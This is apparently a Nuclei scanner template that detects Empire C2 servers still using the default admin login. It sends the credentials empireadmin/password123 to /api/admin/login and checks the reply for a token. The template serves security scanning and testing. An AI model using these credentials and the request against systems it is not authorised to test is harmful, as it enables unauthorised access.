http:
- attack: pitchfork
  matchers:
  - part: body
    regex:
    - '{"token":".*"}'
    type: regex
  - part: header
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    pass:
    - password123
    user:
    - empireadmin
  raw:
  - 'POST /api/admin/login HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"username":"{{user}}","password":"{{pass}}"}

    '
id: empirec2-default-login
info:
  author: clem9669
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  description: Empire C2 contains a default admin login vulnerability. An attacker
    can obtain access to user accounts and access sensitive information, modify data,
    and/or execute unauthorized operations.
  metadata:
    max-request: 1
    verified: true
  name: Empire C2 Default Admin Login - Detect
  reference:
  - https://github.com/BC-SECURITY/Empire
  - https://bc-security.gitbook.io/empire-wiki/quickstart/configuration/server
  severity: high
  tags: default-login,empire
